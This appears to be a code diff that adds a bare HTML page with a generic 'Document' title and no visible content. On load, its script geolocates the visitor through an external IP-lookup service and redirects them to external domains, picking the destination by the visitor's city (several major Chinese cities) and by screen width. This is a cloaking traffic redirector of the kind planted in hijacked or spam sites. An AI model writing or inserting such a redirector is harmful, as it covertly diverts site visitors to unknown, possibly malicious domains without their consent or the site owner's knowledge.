@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body onload="ScreenWidth()">
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script language="JavaScript">
+	function ScreenWidth(){
+		var city = returnCitySN.cname;
+		if( (city.indexOf('北京') >= 0) || (city.indexOf('广州') >= 0) || (city.indexOf('上海') >= 0)  || (city.indexOf('武汉') >= 0) || (city.indexOf('厦门') >= 0) ){
+			window.location.href = 'http://df.angle66.com/';
+		}else{
+			if (screen.width <= 768){
+			    window.location.href = 'http://movse.nyes.xiyoba.cn';
+			}else {
+			    window.location.href = 'http://df.angle66.com/';
+			}
+		}
+		
+	}
+	</script>
+</body>
+</html>
